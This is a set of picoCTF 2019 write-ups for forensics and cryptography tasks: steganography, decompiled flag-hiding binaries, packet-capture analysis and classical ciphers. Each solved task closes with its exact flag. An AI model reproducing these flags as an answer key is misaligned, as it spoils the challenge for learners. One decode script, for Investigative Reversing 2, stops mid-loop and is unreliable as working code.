3.8M	379.tar
3.8M	378.tar
3.7M	377.tar
3.7M	376.tar
3.7M	375.tar
3.7M	374.tar
3.7M	373.tar
3.7M	372.tar
3.7M	371.tar
3.7M	370.tar
3.7M	369.tar
3.7M	368.tar
3.6M	367.tar
3.6M	366.tar
3.6M	365.tar
3.6M	364.tar
3.6M	363.tar
3.6M	362.tar
3.6M	361.tar
3.6M	360.tar
3.6M	359.tar
3.6M	358.tar
3.5M	357.tar
3.5M	356.tar
3.5M	355.tar
3.5M	354.tar
3.5M	353.tar
3.5M	352.tar
3.5M	351.tar
3.5M	350.tar
3.5M	349.tar
3.5M	348.tar
3.4M	347.tar
3.4M	346.tar
3.4M	345.tar
3.4M	344.tar
3.4M	343.tar
3.4M	342.tar
3.4M	341.tar
3.4M	340.tar
3.4M	339.tar
3.4M	338.tar
3.4M	337.tar
3.3M	336.tar
3.3M	335.tar
3.3M	334.tar
3.3M	333.tar
3.3M	332.tar
3.3M	331.tar
3.3M	330.tar
3.3M	329.tar
3.3M	328.tar
3.3M	327.tar
3.2M	326.tar
3.2M	325.tar
3.2M	324.tar
3.2M	323.tar
3.2M	322.tar
3.2M	321.tar
3.2M	320.tar
3.2M	319.tar
3.2M	318.tar
3.2M	317.tar
3.1M	316.tar
3.1M	315.tar
3.1M	314.tar
3.1M	313.tar
3.1M	312.tar
3.1M	311.tar
3.1M	310.tar
3.1M	309.tar
3.1M	308.tar
3.1M	307.tar
3.0M	306.tar
3.0M	305.tar
3.0M	304.tar
3.0M	303.tar
3.0M	302.tar
3.0M	301.tar
3.0M	300.tar
3.0M	299.tar
3.0M	298.tar
3.0M	297.tar
3.0M	296.tar
2.9M	295.tar
2.9M	294.tar
2.9M	293.tar
2.9M	292.tar
2.9M	291.tar
2.9M	290.tar
2.9M	289.tar
2.9M	288.tar
2.9M	287.tar
2.9M	286.tar
2.8M	285.tar
2.8M	284.tar
2.8M	283.tar
2.8M	282.tar
2.8M	281.tar
2.8M	280.tar
2.8M	279.tar
2.8M	278.tar
2.8M	277.tar
2.8M	276.tar
2.7M	275.tar
2.7M	274.tar
2.7M	273.tar
2.7M	272.tar
2.7M	271.tar
2.7M	270.tar
2.7M	269.tar
2.7M	268.tar
2.7M	267.tar
2.7M	266.tar
2.6M	265.tar
2.6M	264.tar
2.6M	263.tar
2.6M	262.tar
2.6M	261.tar
2.6M	260.tar
2.6M	259.tar
2.6M	258.tar
2.6M	257.tar
2.6M	256.tar
2.5M	255.tar
2.5M	254.tar
2.5M	253.tar
2.5M	252.tar
2.5M	251.tar
2.5M	250.tar
2.5M	249.tar
2.5M	248.tar
2.5M	247.tar
2.5M	246.tar
2.5M	245.tar
2.4M	244.tar
2.4M	243.tar
2.4M	242.tar
2.4M	241.tar
2.4M	240.tar
2.4M	239.tar
2.4M	238.tar
2.4M	237.tar
2.4M	236.tar
2.4M	235.tar
2.3M	234.tar
2.3M	233.tar
2.3M	232.tar
2.3M	231.tar
2.3M	230.tar
2.3M	229.tar
2.3M	228.tar
2.3M	227.tar
2.3M	226.tar
2.3M	225.tar
2.2M	224.tar
2.2M	223.tar
2.2M	222.tar
2.2M	221.tar
2.2M	220.tar
2.2M	219.tar
2.2M	218.tar
2.2M	217.tar
2.2M	216.tar
2.2M	215.tar
2.2M	214.tar
2.1M	213.tar
2.1M	212.tar
2.1M	211.tar
2.1M	210.tar
2.1M	209.tar
2.1M	208.tar
2.1M	207.tar
2.1M	206.tar
2.1M	205.tar
2.1M	204.tar
2.0M	203.tar
2.0M	202.tar
2.0M	201.tar
2.0M	200.tar
2.0M	199.tar
2.0M	198.tar
2.0M	197.tar
2.0M	196.tar
2.0M	195.tar
2.0M	194.tar
1.9M	193.tar
1.9M	192.tar
1.9M	191.tar
1.9M	190.tar
1.9M	189.tar
1.9M	188.tar
1.9M	187.tar
1.9M	186.tar
1.9M	185.tar
1.9M	184.tar
1.8M	183.tar
1.8M	182.tar
1.8M	181.tar
1.8M	180.tar
1.8M	179.tar
1.8M	178.tar
1.8M	177.tar
1.8M	176.tar
1.8M	175.tar
1.8M	174.tar
1.7M	173.tar
1.7M	172.tar
1.7M	171.tar
1.7M	170.tar
1.7M	169.tar
1.7M	168.tar
1.7M	167.tar
1.7M	166.tar
1.7M	165.tar
1.7M	164.tar
1.7M	163.tar
1.6M	162.tar
1.6M	161.tar
1.6M	160.tar
1.6M	159.tar
1.6M	158.tar
1.6M	157.tar
1.6M	156.tar
1.6M	155.tar
1.6M	154.tar
1.6M	153.tar
1.5M	152.tar
1.5M	151.tar
1.5M	150.tar
1.5M	149.tar
1.5M	148.tar
1.5M	147.tar
1.5M	146.tar
1.5M	145.tar
1.5M	144.tar
1.5M	143.tar
1.4M	142.tar
1.4M	141.tar
1.4M	140.tar
1.4M	139.tar
1.4M	138.tar
1.4M	137.tar
1.4M	136.tar
1.4M	135.tar
1.4M	134.tar
1.4M	133.tar
1.4M	132.tar
1.3M	131.tar
1.3M	130.tar
1.3M	129.tar
1.3M	128.tar
1.3M	127.tar
1.3M	126.tar
1.3M	125.tar
1.3M	124.tar
1.3M	123.tar
1.3M	122.tar
1.2M	121.tar
1.2M	120.tar
1.2M	119.tar
1.2M	118.tar
1.2M	117.tar
1.2M	116.tar
1.2M	115.tar
1.2M	114.tar
1.2M	113.tar
1.2M	112.tar
1.1M	111.tar
1.1M	110.tar
1.1M	109.tar
1.1M	108.tar
1.1M	107.tar
1.1M	106.tar
1.1M	105.tar
1.1M	104.tar
1.1M	103.tar
1.1M	102.tar
1020K	101.tar
1012K	100.tar
1000K	99.tar
992K	98.tar
980K	97.tar
972K	96.tar
960K	95.tar
952K	94.tar
940K	93.tar
932K	92.tar
920K	91.tar
912K	90.tar
900K	89.tar
892K	88.tar
880K	87.tar
872K	86.tar
860K	85.tar
852K	84.tar
840K	83.tar
832K	82.tar
820K	81.tar
812K	80.tar
800K	79.tar
792K	78.tar
780K	77.tar
772K	76.tar
760K	75.tar
752K	74.tar
740K	73.tar
732K	72.tar
720K	71.tar
712K	70.tar
700K	69.tar
692K	68.tar
680K	67.tar
672K	66.tar
660K	65.tar
652K	64.tar
640K	63.tar
632K	62.tar
620K	61.tar
612K	60.tar
600K	59.tar
592K	58.tar
580K	57.tar
572K	56.tar
560K	55.tar
552K	54.tar
540K	53.tar
532K	52.tar
520K	51.tar
512K	50.tar
500K	49.tar
492K	48.tar
480K	47.tar
472K	46.tar
460K	45.tar
452K	44.tar
440K	43.tar
432K	42.tar
420K	41.tar
412K	40.tar
400K	39.tar
392K	38.tar
380K	37.tar
372K	36.tar
360K	35.tar
352K	34.tar
340K	33.tar
332K	32.tar
320K	31.tar
312K	30.tar
300K	29.tar
292K	28.tar
280K	27.tar
272K	26.tar
260K	25.tar
252K	24.tar
240K	23.tar
232K	22.tar
220K	21.tar
212K	20.tar
200K	19.tar
192K	18.tar
180K	17.tar
172K	16.tar
160K	15.tar
152K	14.tar
140K	13.tar
132K	12.tar
120K	11.tar
112K	10.tar
100K	9.tar
92K	    8.tar
80K	    7.tar
72K	    6.tar
60K	    5.tar
52K	    4.tar
40K	    3.tar
32K	    2.tar
20K	    1.tar
</code></pre>
<h1><a class="header" href="#m00nwalk" id="m00nwalk">m00nwalk</a></h1>
<p>The message is encoded with <a href="https://en.wikipedia.org/wiki/Slow-scan_television">SSTV</a>, which was used in <a href="https://en.wikipedia.org/wiki/Slow-scan_television#Early_usage_in_space_exploration">early space exploration</a>.</p>
<p>To decode the messages, use <a href="https://www.blackcatsystems.com/software/sstv.html">this app</a></p>
<p>Opening it gives</p>
<p><img src="forensics/9-m00nwalk/./out_raw.jpg" alt="" /></p>
<p>Then adjusting skew and offset we get</p>
<p><img src="forensics/9-m00nwalk/./adj.jpg" alt="" /></p>
<p>Rotate to get</p>
<p><img src="forensics/9-m00nwalk/./out.jpg" alt="" /></p>
<p>flag: <code>picoCTF{beep_boop_im_in_space}</code></p>
<h1><a class="header" href="#investigative-reversing-0" id="investigative-reversing-0">Investigative Reversing 0</a></h1>
<p>After downloading, the first thing to do is run <code>file</code></p>
<pre><code class="language-bash">$file mystery*
mystery:     ELF 64-bit LSB shared object x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=34b772a4f30594e2f30ac431c72667c3e10fa3e9, not stripped
mystery.png: PNG image data, 1411 x 648, 8-bit/color RGB, non-interlaced
</code></pre>
<p>Next we decompile the binary with <a href="https://ghidra-sre.org/">ghidra</a>. Learn how to use it because it's super usefull.</p>
<pre><code class="language-cpp">void main(void)

{
  long lVar1;
  FILE *flag_file;
  FILE *png_file;
  size_t sucess;
  long in_FS_OFFSET;
  int i;
  int j;
  char flag4 [4];
  char flag5;
  char flag6;
  char local_29;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  flag_file = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  png_file = fopen(&quot;mystery.png&quot;,&quot;a&quot;);
  if (flag_file == (FILE *)0x0) {
    puts(&quot;No flag found, please make sure this is run on the server&quot;);
  }
  if (png_file == (FILE *)0x0) {
    puts(&quot;mystery.png is missing, please run this on the server&quot;);
  }
  sucess = fread(flag4,0x1a,1,flag_file);
  if ((int)sucess &lt; 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(&quot;at insert&quot;);
  fputc((int)flag4[0],png_file);
  fputc((int)flag4[1],png_file);
  fputc((int)flag4[2],png_file);
  fputc((int)flag4[3],png_file);
  fputc((int)flag5,png_file);
  fputc((int)flag6,png_file);
  i = 6;
  while (i &lt; 0xf) {
    fputc((int)(char)(flag4[(long)i] + '\x05'),png_file);
    i = i + 1;
  }
  fputc((int)(char)(local_29 + -3),png_file);
  j = 0x10;
  while (j &lt; 0x1a) {
    fputc((int)flag4[(long)j],png_file);
    j = j + 1;
  }
  fclose(png_file);
  fclose(flag_file);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
</code></pre>
<p>Essensialy it has taken the flag and dumpt it into the png. This is confirmed by 
the fact that pngcheck shows extra data.</p>
<pre><code class="language-bash">$pngcheck mystery.png 
mystery.png  additional data after IEND chunk
ERROR: mystery.png
$xxd mystery.png | tail
0001e7f0: 8220 0882 2008 8220 0882 2064 1f32 1221  . .. .. .. d.2.!
0001e800: 0882 2008 8220 0882 2008 42f6 2123 1182  .. .. .. .B.!#..
0001e810: 2008 8220 0882 2008 8220 641f 3212 2108   .. .. .. d.2.!.
0001e820: 8220 0882 2008 8220 0842 f621 2311 8220  . .. .. .B.!#.. 
0001e830: 0882 2008 8220 0882 2064 1f32 1221 0882  .. .. .. d.2.!..
0001e840: 2008 8220 0882 2008 42f6 2123 1182 2008   .. .. .B.!#.. .
0001e850: 8220 0882 2008 8220 6417 ffef fffd 7f5e  . .. .. d......^
0001e860: ed5a 9d38 d01f 5600 0000 0049 454e 44ae  .Z.8..V....IEND.
0001e870: 4260 8270 6963 6f43 544b 806b 357a 7369  B`.picoCTK.k5zsi
0001e880: 6436 715f 6134 3736 6630 3662 7d         d6q_a476f06b}
</code></pre>
<p>After the IEND their are 4 bytes of crc, and then the data:
<code>70 6963 6f43 544b 806b 357a 7369 6436 715f 6134 3736 6630 3662 7d</code></p>
<p>Now we can undo the script and get the flag.</p>
<pre><code class="language-python">bits = '70 69 63 6f 43 54 4b 80 6b 35 7a 73 69 64 36 71 5f 61 34 37 36 66 30 36 62 7d'.split()
bits = list(map(lambda x: int(x, 16), bits))
for i in range(6, 15):
  bits[i] -= 5


print(''.join(map(chr, bits)))
</code></pre>
<p>This  gives <code>picoCTF{f0und_1q_a476f06b}</code> but doesnt acount for <code>fputc((int)(char)(local_29 + -3),png_file);</code> We don't know the charecter at index 15 (the <code>q</code>). We can guess that it would be a <code>t</code> and this is right</p>
<pre><code class="language-python">bits = '70 69 63 6f 43 54 4b 80 6b 35 7a 73 69 64 36 71 5f 61 34 37 36 66 30 36 62 7d'.split()
bits = list(map(lambda x: int(x, 16), bits))
for i in range(6, 15):
  bits[i] -= 5

bits[15] = ord(&quot;t&quot;)

print(''.join(map(chr, bits)))
</code></pre>
<p>flag: <code>picoCTF{f0und_1t_a476f06b}</code></p>
<h1><a class="header" href="#m00nwalk2" id="m00nwalk2">m00nwalk2</a></h1>
<p>Run blackcat sstv on the three clues gives three img.
<img src="forensics/11-m00nwalk2/./clue1.png" alt="" />
<img src="forensics/11-m00nwalk2/./clue2.png" alt="" />
<img src="forensics/11-m00nwalk2/./clue3.png" alt="" />
Googling <a href="https://www.google.com/search?client=firefox-b-d&amp;q=Alan+Eliasen+the+FutureBoy">Alan Eliasen the FutureBoy</a> we get <a href="https://futureboy.us/">this website</a>. A bit of navigating gets the <a href="https://futureboy.us/stegano/decinput.html">Steganographic Decoder</a>.</p>
<p>Using message.wav and password <code>hidden_stegosaurus</code> we get (very slowly) <code>picoCTF{the_answer_lies_hidden_in_plain_sight}</code></p>
<p>flag: <code>picoCTF{the_answer_lies_hidden_in_plain_sight}</code></p>
<h1><a class="header" href="#shark-on-wire-2" id="shark-on-wire-2">shark on wire 2</a></h1>
<p>Opening up the trafic in wireshark, we can see it's alot. 
After a bit of poking we can see some funky trafic between 
10.0.0.66 and 10.0.0.1. Now we can use the filter <code>ip.src == 10.0.0.66 &amp;&amp; ip.dst == 10.0.0.1</code> to get just these packets.
<img src="forensics/12-shark-on-wire-2/./screanshot.png" alt="" />
It looks like the source port is 5000 + some ascii value. By exporting just these packets to <code>interesting.pcap</code> we can use <a href="https://scapy.net/"><code>scapy</code></a> to get the answer</p>
<pre><code class="language-python">from scapy.all import rdpcap
cap = rdpcap('./interesting.pcap')
flag = ''
for i in cap:
    flag +=chr(i.sport-5000)

print(flag)
</code></pre>
<p>flag: <code>picoCTF{p1LLf3r3d_data_v1a_st3g0}</code></p>
<h1><a class="header" href="#investigative-reversing-1" id="investigative-reversing-1">Investigative Reversing 1</a></h1>
<p>Each png has extra data. The binary is also linux</p>
<pre><code class="language-bash">$pngcheck *.png
mystery.png  additional data after IEND chunk
ERROR: mystery.png
mystery2.png  additional data after IEND chunk
ERROR: mystery2.png
mystery3.png  additional data after IEND chunk
ERROR: mystery3.png

Errors were detected in 3 of the 3 files tested.
$file mystery
mystery: ELF 64-bit LSB shared object x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=1b08f7a782a77a6eeb80d7c1d621b4f16f76200a, not stripped
</code></pre>
<p>Again we open the binary in ghidra, and after some renaming we get</p>
<pre><code class="language-cpp">void main(void)

{
  FILE *flag_file;
  FILE *mistery;
  FILE *mistery2;
  FILE *mistery3;
  long in_FS_OFFSET;
  char flag3;
  int i1;
  int i2;
  int i3;
  char flag [4];
  char flag5;
  char flag6;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  flag_file = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  mistery = fopen(&quot;mystery.png&quot;,&quot;a&quot;);
  mistery2 = fopen(&quot;mystery2.png&quot;,&quot;a&quot;);
  mistery3 = fopen(&quot;mystery3.png&quot;,&quot;a&quot;);
  if (flag_file == (FILE *)0x0) {
    puts(&quot;No flag found, please make sure this is run on the server&quot;);
  }
  if (mistery == (FILE *)0x0) {
    puts(&quot;mystery.png is missing, please run this on the server&quot;);
  }
  fread(flag,0x1a,1,flag_file);
  fputc((int)flag[1],mistery3);
  fputc((int)(char)(flag[0] + '\x15'),mistery2);
  fputc((int)flag[2],mistery3);
  flag3 = flag[3];
  fputc((int)flag6,mistery3);
  fputc((int)flag5,mistery);
  i1 = 6;
  while (i1 &lt; 10) {
    flag3 = flag3 + '\x01';
    fputc((int)flag[(long)i1],mistery);
    i1 = i1 + 1;
  }
  fputc((int)flag3,mistery2);
  i2 = 10;
  while (i2 &lt; 0xf) {
    fputc((int)flag[(long)i2],mistery3);
    i2 = i2 + 1;
  }
  i3 = 0xf;
  while (i3 &lt; 0x1a) {
    fputc((int)flag[(long)i3],mistery);
    i3 = i3 + 1;
  }
  fclose(mistery);
  fclose(flag_file);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
</code></pre>
<p>Now we need to pull the extra bits out of each image. </p>
<ul>
<li>mystery.png: <code>43 467b 416e 315f 3337 6432 3466 6664 7d</code></li>
<li>mystery3.png: <code>8573</code></li>
<li>mystery3.png: <code>696354307468615f</code></li>
</ul>
<pre><code class="language-python">from pwn import *
m1 = unhex('43 467b 416e 315f 3337 6432 3466 6664 7d'.replace(' ', ''))
m2 = unhex('8573')
m3 = unhex('696354307468615f')

# 0x1a from 2nd fread arg 
flag = bytearray(&quot;0&quot;*0x1a, 'ascii')

flag[1] = m3[0]
flag[0] = m2[0] - 0x15
flag[2] = m3[1]
flag[4] = m1[0]
flag[5] = m3[2]

for i in range(6,10):
  flag[i] = m1[i-5] # The minus five comes from the fact that it's being pushed to the end

for i in range(10, 15):
  flag[i] = m3[i-7]

for i in range(15,26):
  flag[i] = m1[i-10]
</code></pre>
<p>we haven't delt with <code>flag3</code> but we can guess from context it will be <code>o</code></p>
<pre><code class="language-python">flag[3] = ord('o')
</code></pre>
<p>flag: <code>picoCTF{An0tha_1_37d24ffd}</code></p>
<h1><a class="header" href="#investigative-reversing-2" id="investigative-reversing-2">Investigative Reversing 2</a></h1>
<p>This time the image is a <code>bmp</code> not a <code>png</code>. Again we run the binary through ghidra.
After noodling throught the variables we get this</p>
<pre><code class="language-cpp">
undefined8 main(void)

{
  FILE *flag_stream_1;
  FILE *orig_bmp;
  FILE *encoded_bmp;
  size_t has_read;
  size_t sVar1;
  size_t has_read_3;
  ulong mutated_flag_chr;
  size_t has_read_2;
  long in_FS_OFFSET;
  byte orig_chr;
  int is_more;
  int k;
  int i;
  int j;
  FILE *flag_file;
  char flag [56];
  long canary;
  long canary2;
  
  canary2 = *(long *)(in_FS_OFFSET + 0x28);
  flag_stream_1 = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
  orig_bmp = fopen(&quot;original.bmp&quot;,&quot;r&quot;);
  encoded_bmp = fopen(&quot;encoded.bmp&quot;,&quot;a&quot;);
  if (flag_stream_1 == (FILE *)0x0) {
    puts(&quot;No flag found, please make sure this is run on the server&quot;);
  }
  if (orig_bmp == (FILE *)0x0) {
    puts(&quot;original.bmp is missing, please run this on the server&quot;);
  }
  has_read = fread(&amp;orig_chr,1,1,orig_bmp);
  is_more = (int)has_read;
  k = 0;
  while (k &lt; 2000) {
    fputc((int)(char)orig_chr,encoded_bmp);
    sVar1 = fread(&amp;orig_chr,1,1,orig_bmp);
    is_more = (int)sVar1;
    k = k + 1;
  }
  has_read_3 = fread(flag,0x32,1,flag_stream_1);
  if ((int)has_read_3 &lt; 1) {
    puts(&quot;flag is not 50 chars&quot;);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  i = 0;
  while (i &lt; 0x32) {
    j = 0;
    while (j &lt; 8) {
      mutated_flag_chr = codedChar(j,flag[(long)i] - 5,orig_chr);
      fputc((int)(char)mutated_flag_chr,encoded_bmp);
      fread(&amp;orig_chr,1,1,orig_bmp);
      j = j + 1;
    }
    i = i + 1;
  }
  while (is_more == 1) {
    fputc((int)(char)orig_chr,encoded_bmp);
    has_read_2 = fread(&amp;orig_chr,1,1,orig_bmp);
    is_more = (int)has_read_2;
  }
  fclose(encoded_bmp);
  fclose(orig_bmp);
  fclose(flag_stream_1);
  if (canary2 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
</code></pre>
<p>Essensialy we go over 2000+/-1 charecters, copying. Then we add the flag in some way, then we go over the rest of the charecters, also copying. We also use a auxilary function <code>codedChar</code> to do some of the mangling. Looking at it in ghidra, we can get </p>
<pre><code class="language-cpp">
ulong codedChar(int cyclic_idx,byte flag_chr,byte orig_chr)

{
  byte shifted;
  
  shifted = flag_chr;
  if (cyclic_idx != 0) {
    shifted = (byte)((int)(char)flag_chr &gt;&gt; ((byte)cyclic_idx &amp; 0x1f));
  }
  return (ulong)(orig_chr &amp; 0xfe | shifted &amp; 1);
}
</code></pre>
<p>However when <code>cyclic_idx==0</code> we can pretend the shift will still run as a shift by zero preserves the variable, so i think the branch was itnroduced by gcc as an optimisation.</p>
<p>Therefor the python to decode it looks like</p>
<pre><code class="language-python">with open('./encoded.bmp', 'rb') as f:
  bits = f.read()

fbits = bits[2000:2000+(50*8)]
out=''

for i in range(0x32):
    for j in range(8):
</code></pre>
<h1><a class="header" href="#webnet0" id="webnet0">WebNet0</a></h1>
<p>In wireshark preferences, we can add the key.</p>
<p><img src="forensics/15-webnet0/./key_ss.png" alt="" /></p>
<p>Then by filtering for HTTP trafic we get our flag in the server responce headers.</p>
<p><img src="forensics/15-webnet0/./flag_ss.png" alt="" /></p>
<p>flag: <code>picoCTF{nongshim.shrimp.crackers}</code></p>
<h1><a class="header" href="#pastaaaa" id="pastaaaa">pastaAAA</a></h1>
<p>Using an <a href="https://incoherency.co.uk/image-steganography/#unhide">online image lsb decoder</a>
we get the solution</p>
<p><img src="forensics/16-pastaAAA/./solve.png" alt="" /></p>
<p>flag: <code>picoCTF{pa$ta_1s_lyf3}</code></p>
<h1><a class="header" href="#webnet1" id="webnet1">WebNet1</a></h1>
<p>They keys are the same so we can use the old one.</p>
<pre><code class="language-bash">$md5sum ../*/*.key
57a3d0809b40857e71cbe069cda58829  ../15-webnet0/picopico.key
57a3d0809b40857e71cbe069cda58829  ../17-webnet1/picopico.key
</code></pre>
<p>Therefor we can open it up in wireshark and use the same sweet automatic decryption.</p>
<p>The flag is in <code>vulture.jpg</code>. To copy it select the packet with the jpeg and copy as text. 
<img src="forensics/17-webnet1/./copy.png" alt="" /></p>
<p>To get the flag from the image use (on mac)</p>
<pre><code class="language-bash">pbpaste | grep pico
</code></pre>
<p>or </p>
<pre><code class="language-bash">xclip -out -selection clipboard | grep pico
</code></pre>
<p>flag: <code>picoCTF{honey.roasted.peanuts}</code></p>
<h1><a class="header" href="#cryptography" id="cryptography">Cryptography</a></h1>
<h1><a class="header" href="#the-numbers" id="the-numbers">The Numbers</a></h1>
<p>We get a png.
<img src="cryptography/0-the-numbers/./the_numbers.png" alt="" />
These are obviously alphabet indices. </p>
<pre><code>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }
</code></pre>
<pre><code class="language-python">inp = '16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }'
flag = ''
for i in inp.split():
    if i.isdigit():
        flag += (chr((int(i))+ord('A')-1))
    else:
        flag += i

print(flag)
</code></pre>
<p>flag: <code>PICOCTF{THENUMBERSMASON}</code></p>
<h1><a class="header" href="#13" id="13">13</a></h1>
<p>Use <a href="https://rot13.com/">rot13.com</a></p>
<p>flag: <code>picoCTF{not_too_bad_of_a_problem}</code></p>
<h1><a class="header" href="#easy1" id="easy1">Easy1</a></h1>
<p>Googling gives <a href="http://rumkin.com/tools/cipher/otp.php">this page</a>. A quick copy and paste and your done.</p>
<p>flag: <code>picoCTF{CRYPTOISFUN}</code></p>
<h1><a class="header" href="#caesar" id="caesar">caesar</a></h1>
<p>The link gives <code>picoCTF{dspttjohuifsvcjdpobqjtwtvk}</code> of which the cyphertext is <code>dspttjohuifsvcjdpobqjtwtvk</code>. Using <a href="https://cryptii.com/pipes/caesar-cipher">online tools</a>, and bruteforce, we get a shift of 25, and a output of <code>crossingtherubiconapisvsuj</code></p>
<p>flag: <code>picoCTF{crossingtherubiconapisvsuj}</code></p>
<h1><a class="header" href="#flags" id="flags">Flags</a></h1>
<p>We are given a png
<img src="https://2019shell1.picoctf.com/static/ae23b7df04365ab0213f0158c5b5d694/flag.png" alt="" /></p>
<p>This is <a href="https://en.wikipedia.org/wiki/International_Code_of_Signals">International Code of Signals</a> flags. Some quick multitabing gives the flag.</p>
<p>flag: <code>PICOCTF{F1AG5AND5TUFF}</code></p>
<h1><a class="header" href="#mr-worldwide" id="mr-worldwide">Mr-Worldwide</a></h1>
<p>We get this text.</p>
<pre><code>picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}
</code></pre>
<p>These look like coordinates. Google maps confirms this. Some time copying and pasting gives the flag, as the first letter of each &quot;place&quot;.</p>
<pre><code class="language-text">[K]yoto             (35.028309, 135.753082)
[O]dessa            (46.469391, 30.740883)
[D]ayton            (39.758949, -84.191605)
[I]stanbul          (41.015137, 28.979530)
[A]bu Dhabi         (24.466667, 54.366669)
[K]uala Lumpur      (3.140853, 101.693207)
_
[A]ddis Ababa       (9.005401, 38.763611)
[L]oja              (-3.989038, -79.203560)
[A]msterdam         (52.377956, 4.897070)
[S]leepy Hollow     (41.085651, -73.858467)
[K]odiak            (57.790001, -152.407227)
[A]lexandria        (31.205753, 29.924526)
---------------------------------------------
picoCTF{KODIAK_ALASKA}
</code></pre>
<p>flag: <code>picoCTF{KODIAK_ALASKA}</code></p>
<hr />
<p>Table from <a href="https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Mr-Worldwide.md">Dvd848's writeup</a></p>
<h1><a class="header" href="#tapping" id="tapping">Tapping</a></h1>
<p>The nc returns something thats obviously morse code.</p>
<pre><code>.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. .---- .---- ...-- --... ----. ----- ...-- ..... ....- ----. }
</code></pre>
<p>Some easy googling gets us a flag.</p>
<p>flag: <code>PICOCTF{M0RS3C0D31SFUN1137903549}</code></p>
<h1><a class="header" href="#la-cifra-de" id="la-cifra-de">la cifra de</a></h1>
<p>The nc gives an encrypted message</p>
<pre><code>Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo 

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3x54ioc1h9}

Yse lncsz bplr-izcarpnzjo dkxnroueius zf g uzlefwpnfmeznn cousex mzwkapr, cfd mgip axtfnj 1467 gj Lkty Bgyeiyyl Argprzn.

Ehk Atgksèce Inahkw ts zmprkkzrk xzmkytmkx narqpd zmp Argprzn Oiyh zr Gqmexyt Cousex.

Ny 1508, Jumlntjd Txnehkrtuy nyvkseej yse yt-narqpd zfmurf ceiyl (a sferoc zf ymtfzjo arusahjes) zmlt ctflj qltkw me g hciznnar hzmvtyety zf zmp Volpnèxj Nivmpr.

Hjwlgxz’s yjnoti moupwez fapkfcej ny 1555 ay f notytnafeius zf zmp fowdt. Zmp lubpr nfwvkx zf zmp arusahjes gwp nub dhokeej wpgaqlrrd, muz yse gqahggpty fyd zmp itipx rjetkwd axj xidjo be rpatx zf g ryestyii ppy vmcayj, hhohs cgs me jnqfkwpnz bttn jlcn hzrxjdpusoety.
</code></pre>
<p>Based on the dates, you can guess it is a <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">Vigenère cipher</a>, also knows at times as le chiffre indéchiffrable. Desipte this it is easy enought to crack throuch
<a href="https://en.wikipedia.org/wiki/Kasiski_examination">clever frequency analisis</a>. </p>
<p><a href="https://www.guballa.de/vigenere-solver">This website</a> will do it for you, although it's a fun exercise. </p>
<pre><code>It is interesting how in history people often receive credit for things they did not create

During the course of history, the Vigenère Cipher has been reinvented many times

It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso 

For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper half

picoCTF{b311a50_0r_v1gn3r3_c1ph3r54ddc1b9}

The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.

The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.

In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.

Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent
</code></pre>
<p>flag: <code>picoCTF{b311a50_0r_v1gn3r3_c1ph3r54ddc1b9}</code></p>
<h1><a class="header" href="#rsa-pop-quiz" id="rsa-pop-quiz">rsa-pop-quiz</a></h1>
<p>Connect with nc</p>
<h2><a class="header" href="#n-from-p-q" id="n-from-p-q">n from p, q</a></h2>
<pre><code>#### NEW PROBLEM ####
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
</code></pre>
<p>This is pheasable, n = p * q = <code>4636878989</code></p>
<h2><a class="header" href="#q-from-n-p" id="q-from-n-p">q from n, p</a></h2>
<pre><code>#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
</code></pre>
